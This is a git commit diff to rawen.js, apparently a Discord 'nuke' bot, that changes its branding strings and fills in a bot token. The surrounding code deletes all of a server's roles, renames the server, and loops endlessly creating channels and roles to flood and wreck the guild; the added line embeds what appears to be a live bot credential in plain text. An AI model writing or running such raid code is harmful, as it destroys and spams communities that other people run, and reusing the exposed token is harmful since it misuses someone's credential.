537efdec9909c19e478577852b3724f47a0ebf2b
DimOD2x <89885606+DimOD2x@users.noreply.github.com>
2021-09-03 06:38:36 +0300

    Update rawen.js

--- rawen.js
+++ rawen.js
@@ -15,14 +15,14 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("RaWeN Up");////nawek dane bo sar server 
+      message.guild.setName("DimOD UP");////nawek dane bo sar server 
       setInterval(function() {
-        message.guild.createChannel("RaWeN Up", "text");///////bo channel 
-        message.guild.createChannel("RaWeN Up", "voice");////bo voice
-        message.guild.createRole({ name: "RaWeN Up" });////nawek dane bo role kan
+        message.guild.createChannel("DimOD UP", "text");///////bo channel 
+        message.guild.createChannel("DimOD UP", "voice");////bo voice
+        message.guild.createRole({ name: "DimOD BEST KURDISH DEVELOPER" });////nawek dane bo role kan
       });
     }
   }
 });
 
-client.login("")
+client.login("ODMzNTg3OTE3NDM1NDM3MDc2.YH0hPg.XjD1GR4d7Ei06x-owih2r0RrIe4")
